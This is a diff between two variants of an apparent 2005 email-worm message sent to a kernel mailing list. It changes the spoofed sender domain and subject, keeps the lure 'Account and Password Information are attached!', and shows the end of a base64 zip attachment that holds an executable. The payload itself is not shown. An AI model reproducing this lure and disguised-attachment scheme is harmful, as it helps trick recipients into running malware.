@@ -1,26 +1,26 @@
-From: hostmaster@iae.nl
-Subject: Your Password
-Date: Thu, 22 Dec 2005 07:11:33 GMT
-Message-ID: <de2a04b01847.7aea@iae.nl>
+From: info@zmailer.org
+Subject: Registration Confirmation
+Date: Thu, 22 Dec 2005 06:50:49 UTC
+Message-ID: <e8ada0acddfdf6b93fc9@sxujrblur.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=85e36278a8c7f5c91"
+Content-Type: multipart/mixed; boundary="====ee4fc3a204cb0e.9ce98"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: x-Recipient@oss.sgi.com
+To: listening@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=85e36278a8c7f5c91
+--====ee4fc3a204cb0e.9ce98
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.iae.nl
-***** Email: postman@iae.nl
---=85e36278a8c7f5c91
+***** Go to: http://www.zmailer.org
+***** Email: postman@zmailer.org
+--====ee4fc3a204cb0e.9ce98
 Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass-data.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=85e36278a8c7f5c91--
+--====ee4fc3a204cb0e.9ce98--
